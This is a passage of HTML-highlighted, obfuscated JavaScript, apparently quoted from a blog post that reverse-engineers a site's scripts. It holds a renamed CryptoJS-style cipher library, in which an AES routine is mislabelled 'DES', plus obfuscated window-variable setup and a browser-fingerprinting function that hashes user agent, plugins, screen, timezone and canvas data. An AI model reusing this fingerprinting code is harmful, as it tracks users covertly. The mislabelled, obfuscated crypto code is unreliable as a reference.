class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_invSubKeys</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doCryptBlock</span>: <span class="keyword">function</span>(<span class="params">r, n, i</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_lBlock</span> = r[n],</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_rBlock</span> = r[n + <span class="number">1</span>],</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">4</span>, <span class="number">252645135</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">16</span>, <span class="number">65535</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">2</span>, <span class="number">858993459</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">8</span>, <span class="number">16711935</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">1431655765</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; <span class="number">16</span> &gt; o; o++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a = i[o], s = <span class="variable language_">this</span>.<span class="property">_lBlock</span>, c = <span class="variable language_">this</span>.<span class="property">_rBlock</span>, h = <span class="number">0</span>, p = <span class="number">0</span>; <span class="number">8</span> &gt; p; p++)</span><br><span class="line">                    h |= l[p][((c ^ a[p]) &amp; u[p]) &gt;&gt;&gt; <span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_lBlock</span> = c,</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_rBlock</span> = s ^ h</span><br><span class="line">            &#125;</span><br><span class="line">            i = <span class="variable language_">this</span>.<span class="property">_lBlock</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_lBlock</span> = <span class="variable language_">this</span>.<span class="property">_rBlock</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_rBlock</span> = i,</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">1431655765</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">8</span>, <span class="number">16711935</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">2</span>, <span class="number">858993459</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">16</span>, <span class="number">65535</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">4</span>, <span class="number">252645135</span>),</span><br><span class="line">            r[n] = <span class="variable language_">this</span>.<span class="property">_lBlock</span>,</span><br><span class="line">            r[n + <span class="number">1</span>] = <span class="variable language_">this</span>.<span class="property">_rBlock</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">2</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKrleD&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; h.<span class="property">length</span>; c++)</span><br><span class="line">        <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKrleD&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)] += h[c];</span><br><span class="line">    r.<span class="property">DES</span> = n.<span class="title function_">_createHelper</span>(p),</span><br><span class="line">    o = o.<span class="property">TripleDES</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>.<span class="property">words</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span>))),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">4</span>))),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">4</span>, <span class="number">6</span>)))</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span>.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span>.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span>.<span class="title function_">encryptBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span>.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span>.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span>.<span class="title function_">decryptBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">6</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">2</span></span><br><span class="line">    &#125;),</span><br><span class="line">    r.<span class="property">TripleDES</span> = n.<span class="title function_">_createHelper</span>(o)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = coypJsDk, t = e.<span class="property">lib</span>.<span class="property">BlockCipher</span>, r = e.<span class="property">algo</span>, n = [], i = [], o = [], a = [], s = [], c = [], l = [], h = [], u = [], p = [], f = [], d = <span class="number">0</span>; <span class="number">256</span> &gt; d; d++)</span><br><span class="line">        f[d] = <span class="number">128</span> &gt; d ? d &lt;&lt; <span class="number">1</span> : d &lt;&lt; <span class="number">1</span> ^ <span class="number">283</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="number">0</span>, y = <span class="number">0</span>, d = <span class="number">0</span>; <span class="number">256</span> &gt; d; d++) &#123;</span><br><span class="line">        <span class="keyword">var</span> g = y ^ y &lt;&lt; <span class="number">1</span> ^ y &lt;&lt; <span class="number">2</span> ^ y &lt;&lt; <span class="number">3</span> ^ y &lt;&lt; <span class="number">4</span></span><br><span class="line">          , g = g &gt;&gt;&gt; <span class="number">8</span> ^ <span class="number">255</span> &amp; g ^ <span class="number">99</span>;</span><br><span class="line">        n[_] = g,</span><br><span class="line">        i[g] = _;</span><br><span class="line">        <span class="keyword">var</span> v = f[_]</span><br><span class="line">          , m = f[v]</span><br><span class="line">          , k = f[m]</span><br><span class="line">          , w = <span class="number">257</span> * f[g] ^ <span class="number">16843008</span> * g;</span><br><span class="line">        o[_] = w &lt;&lt; <span class="number">24</span> | w &gt;&gt;&gt; <span class="number">8</span>,</span><br><span class="line">        a[_] = w &lt;&lt; <span class="number">16</span> | w &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        s[_] = w &lt;&lt; <span class="number">8</span> | w &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">        c[_] = w,</span><br><span class="line">        w = <span class="number">16843009</span> * k ^ <span class="number">65537</span> * m ^ <span class="number">257</span> * v ^ <span class="number">16843008</span> * _,</span><br><span class="line">        l[g] = w &lt;&lt; <span class="number">24</span> | w &gt;&gt;&gt; <span class="number">8</span>,</span><br><span class="line">        h[g] = w &lt;&lt; <span class="number">16</span> | w &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        u[g] = w &lt;&lt; <span class="number">8</span> | w &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">        p[g] = w,</span><br><span class="line">        _ ? (_ = v ^ f[f[f[k ^ v]]],</span><br><span class="line">        y ^= f[f[y]]) : _ = y = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> b = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>, <span class="number">27</span>, <span class="number">54</span>]</span><br><span class="line">      , r = r.<span class="property">DES</span> = t.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>, t = e.<span class="property">words</span>, r = e.<span class="property">sigBytes</span> / <span class="number">4</span>, e = <span class="number">4</span> * ((<span class="variable language_">this</span>.<span class="property">_nRounds</span> = r + <span class="number">6</span>) + <span class="number">1</span>), i = <span class="variable language_">this</span>.<span class="property">_keySchedule</span> = [], o = <span class="number">0</span>; e &gt; o; o++)</span><br><span class="line">                <span class="keyword">if</span> (r &gt; o)</span><br><span class="line">                    i[o] = t[o];</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> a = i[o - <span class="number">1</span>];</span><br><span class="line">                    o % r ? r &gt; <span class="number">6</span> &amp;&amp; <span class="number">4</span> == o % r &amp;&amp; (a = n[a &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | n[<span class="number">255</span> &amp; a]) : (a = a &lt;&lt; <span class="number">8</span> | a &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">                    a = n[a &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | n[<span class="number">255</span> &amp; a],</span><br><span class="line">                    a ^= b[o / r | <span class="number">0</span>] &lt;&lt; <span class="number">24</span>),</span><br><span class="line">                    i[o] = i[o - r] ^ a</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">for</span> (t = <span class="variable language_">this</span>.<span class="property">_invKeySchedule</span> = [],</span><br><span class="line">            r = <span class="number">0</span>; e &gt; r; r++)</span><br><span class="line">                o = e - r,</span><br><span class="line">                a = r % <span class="number">4</span> ? i[o] : i[o - <span class="number">4</span>],</span><br><span class="line">                t[r] = <span class="number">4</span> &gt; r || <span class="number">4</span> &gt;= o ? a : l[n[a &gt;&gt;&gt; <span class="number">24</span>]] ^ h[n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>]] ^ u[n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>]] ^ p[n[<span class="number">255</span> &amp; a]]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_keySchedule</span>, o, a, s, c, n)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = e[t + <span class="number">1</span>];</span><br><span class="line">            e[t + <span class="number">1</span>] = e[t + <span class="number">3</span>],</span><br><span class="line">            e[t + <span class="number">3</span>] = r,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_invKeySchedule</span>, l, h, u, p, i),</span><br><span class="line">            r = e[t + <span class="number">1</span>],</span><br><span class="line">            e[t + <span class="number">1</span>] = e[t + <span class="number">3</span>],</span><br><span class="line">            e[t + <span class="number">3</span>] = r</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doCryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n, i, o, a, s</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="variable language_">this</span>.<span class="property">_nRounds</span>, l = e[t] ^ r[<span class="number">0</span>], h = e[t + <span class="number">1</span>] ^ r[<span class="number">1</span>], u = e[t + <span class="number">2</span>] ^ r[<span class="number">2</span>], p = e[t + <span class="number">3</span>] ^ r[<span class="number">3</span>], f = <span class="number">4</span>, d = <span class="number">1</span>; c &gt; d; d++)</span><br><span class="line">                <span class="keyword">var</span> _ = n[l &gt;&gt;&gt; <span class="number">24</span>] ^ i[h &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[u &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; p] ^ r[f++]</span><br><span class="line">                  , y = n[h &gt;&gt;&gt; <span class="number">24</span>] ^ i[u &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[p &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; l] ^ r[f++]</span><br><span class="line">                  , g = n[u &gt;&gt;&gt; <span class="number">24</span>] ^ i[p &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[l &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; h] ^ r[f++]</span><br><span class="line">                  , p = n[p &gt;&gt;&gt; <span class="number">24</span>] ^ i[l &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[h &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; u] ^ r[f++]</span><br><span class="line">                  , l = _</span><br><span class="line">                  , h = y</span><br><span class="line">                  , u = g;</span><br><span class="line">            _ = (s[l &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[h &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[u &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; p]) ^ r[f++],</span><br><span class="line">            y = (s[h &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[u &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[p &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; l]) ^ r[f++],</span><br><span class="line">            g = (s[u &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[p &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[l &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; h]) ^ r[f++],</span><br><span class="line">            p = (s[p &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[l &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[h &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; u]) ^ r[f++],</span><br><span class="line">            e[t] = _,</span><br><span class="line">            e[t + <span class="number">1</span>] = y,</span><br><span class="line">            e[t + <span class="number">2</span>] = g,</span><br><span class="line">            e[t + <span class="number">3</span>] = p</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">8</span></span><br><span class="line">    &#125;);</span><br><span class="line">    e.<span class="property">DES</span> = t.<span class="title function_">_createHelper</span>(r)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">ea_</span> = <span class="string">&quot;e&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> coyp = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ea_ + av_ + nvl_</span><br><span class="line">&#125;();</span><br><span class="line">coypJsDk.<span class="property">mode</span>.<span class="property">CBC</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk.<span class="property">lib</span>.<span class="property">BlockCipherMode</span>.<span class="title function_">extend</span>();</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">Encryptor</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span>.<span class="title function_">encryptBlock</span>(e, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    e.<span class="property">Decryptor</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span>.<span class="title function_">decryptBlock</span>(e, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    e</span><br><span class="line">&#125;();</span><br><span class="line"><span class="keyword">var</span> referFingerprint = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t, r;</span><br><span class="line">    t = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>,</span><br><span class="line">    r = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">map</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">each</span> = <span class="keyword">function</span>(<span class="params">e, r, n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> !== e)</span><br><span class="line">            <span class="keyword">if</span> (t &amp;&amp; e.<span class="property">forEach</span> === t)</span><br><span class="line">                e.<span class="title function_">forEach</span>(r, n);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">length</span> === +e.<span class="property">length</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, o = e.<span class="property">length</span>; o &gt; i; i++)</span><br><span class="line">                    <span class="keyword">if</span> (r.<span class="title function_">call</span>(n, e[i], i, e) === &#123;&#125;)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> e)</span><br><span class="line">                    <span class="keyword">if</span> (e.<span class="title function_">hasOwnProperty</span>(a) &amp;&amp; r.<span class="title function_">call</span>(n, e[a], a, e) === &#123;&#125;)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span> = <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span> == e ? i : r &amp;&amp; e.<span class="property">map</span> === r ? e.<span class="title function_">map</span>(t, n) : (<span class="variable language_">this</span>.<span class="title function_">each</span>(e, <span class="keyword">function</span>(<span class="params">e, r, o</span>) &#123;</span><br><span class="line">            i[i.<span class="property">length</span>] = t.<span class="title function_">call</span>(n, e, r, o)</span><br><span class="line">        &#125;),</span><br><span class="line">        i)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> e ? (<span class="variable language_">this</span>.<span class="property">hasher</span> = e.<span class="property">hasher</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">screen_resolution</span> = e.<span class="property">screen_resolution</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">canvas</span> = e.<span class="property">canvas</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ie_activex</span> = e.<span class="property">ie_activex</span>) : <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (<span class="variable language_">this</span>.<span class="property">hasher</span> = e)</span><br><span class="line">&#125;;</span><br><span class="line">referFingerprint.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = [];</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="title function_">push</span>(navigator.<span class="property">userAgent</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">language</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(screen.<span class="property">colorDepth</span>),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screen_resolution</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">getScreenResolution</span>();</span><br><span class="line">            <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getScreenResolution</span>().<span class="title function_">join</span>(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">push</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTimezoneOffset</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">hasSessionStorage</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">hasLocalStorage</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(!!<span class="variable language_">window</span>.<span class="property">indexedDB</span>),</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span> ? e.<span class="title function_">push</span>(<span class="keyword">typeof</span> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">addBehavior</span>) : e.<span class="title function_">push</span>(<span class="string">&quot;undefined&quot;</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">openDatabase</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">cpuClass</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">platform</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">doNotTrack</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getPluginsString</span>()),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">canvas</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">isCanvasSupported</span>() &amp;&amp; e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getCanvasFingerprint</span>()),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hasher</span> ? <span class="variable language_">this</span>.<span class="title function_">hasher</span>(e.<span class="title function_">join</span>(<span class="string">&quot;###&quot;</span>), <span class="number">31</span>) : <span class="variable language_">this</span>.<span class="title function_">murmurhash3_32_gc</span>(e.<span class="title function_">join</span>(<span class="string">&quot;###&quot;</span>), <span class="number">31</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">murmurhash3_32_gc</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r, n, i, o, a, s, c, l;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">3</span> &amp; e.<span class="property">length</span>,</span><br><span class="line">        n = e.<span class="property">length</span> - r,</span><br><span class="line">        i = t,</span><br><span class="line">        a = <span class="number">3432918353</span>,</span><br><span class="line">        s = <span class="number">461845907</span>,</span><br><span class="line">        l = <span class="number">0</span>; n &gt; l; )</span><br><span class="line">            c = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l) | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">8</span> | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">16</span> | (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(++l)) &lt;&lt; <span class="number">24</span>,</span><br><span class="line">            ++l,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * a + (((c &gt;&gt;&gt; <span class="number">16</span>) * a &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            c = c &lt;&lt; <span class="number">15</span> | c &gt;&gt;&gt; <span class="number">17</span>,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * s + (((c &gt;&gt;&gt; <span class="number">16</span>) * s &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i ^= c,</span><br><span class="line">            i = i &lt;&lt; <span class="number">13</span> | i &gt;&gt;&gt; <span class="number">19</span>,</span><br><span class="line">            o = <span class="number">5</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">5</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i = (<span class="number">65535</span> &amp; o) + <span class="number">27492</span> + (((o &gt;&gt;&gt; <span class="number">16</span>) + <span class="number">58964</span> &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">switch</span> (c = <span class="number">0</span>,</span><br><span class="line">        r) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            c ^= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l + <span class="number">2</span>)) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            c ^= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l + <span class="number">1</span>)) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            c ^= <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(l),</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * a + (((c &gt;&gt;&gt; <span class="number">16</span>) * a &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            c = c &lt;&lt; <span class="number">15</span> | c &gt;&gt;&gt; <span class="number">17</span>,</span><br><span class="line">            c = (<span class="number">65535</span> &amp; c) * s + (((c &gt;&gt;&gt; <span class="number">16</span>) * s &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">            i ^= c</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i ^= e.<span class="property">length</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        i = <span class="number">2246822507</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">2246822507</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">13</span>,</span><br><span class="line">        i = <span class="number">3266489909</span> * (<span class="number">65535</span> &amp; i) + ((<span class="number">3266489909</span> * (i &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">65535</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">4294967295</span>,</span><br><span class="line">        i ^= i &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        i &gt;&gt;&gt; <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasLocalStorage</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> !!<span class="variable language_">window</span>.<span class="property">localStorage</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">        